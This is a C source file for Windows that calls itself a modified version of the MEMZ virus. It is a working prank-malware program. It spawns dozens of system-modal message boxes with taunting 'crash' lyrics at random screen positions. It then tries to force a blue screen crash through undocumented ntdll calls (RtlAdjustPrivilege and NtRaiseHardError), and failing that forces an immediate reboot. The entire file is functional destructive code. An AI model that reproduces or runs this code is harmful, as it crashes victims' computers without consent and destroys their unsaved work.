#include<stdio.h>
#include<windows.h>
#include<time.h>
#include<stdlib.h>
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>

//This code is taken and modified from memz virus: https://github.com/Leurak/MEMZ

DWORD WINAPI ripMessageThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
extern int r = 0;

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	srand(time(NULL) + r);
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = rand() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = rand() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);
			r = rand() % 16384;
			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
int main() {
	//srand(time(NULL));
	// Show cool MessageBoxes
	for (int i = 0; i < 32; i++) {
	//while(true){
		CreateThread(NULL, 0, &ripMessageThread, NULL, NULL, NULL);
		//thread t1(ripMessageThread, NULL);
		Sleep(75);
	} //return 0;
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}
//return 0;
	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
	return 0;
}
DWORD WINAPI ripMessageThread(LPVOID parameter) {
	srand(time(NULL) + r);
	char* msgs[] = {
		"YOU ARE NUMBER 2",
		"U SPORTAOCK",
		"Get h4k€d fr0m p1x€l",
		"Now look at this crash\n\rthat I've just found",
		"W H A T\n\rR U\n\rD O I N G ?",
		"Here's a little crash, in trickery",
		"Windows is going down\n\rIn history",
		"If u wanna have a crash n.1",
		"You need to bsod ur windows when it run",
		"...and crash around",
		"be carrefull make a crash...",
		"NONO DON'T CRASH PLS",
		"When I say \"CRASH\"",
		"Be ready to crash",
		"...and\n\rCRASH!",
		"oh, let's crash something else",
		"Now watch, and learn\n\rHere's the crash",
		"He'll slip and slipe on this BSOD!",
		"I'm the crash number one"
	};
	size_t nMsgs = sizeof(msgs) / sizeof(void *);
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[rand() % nMsgs], "(Real)NumberOne", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	r = rand() % 16384;
	UnhookWindowsHookEx(hook);
}





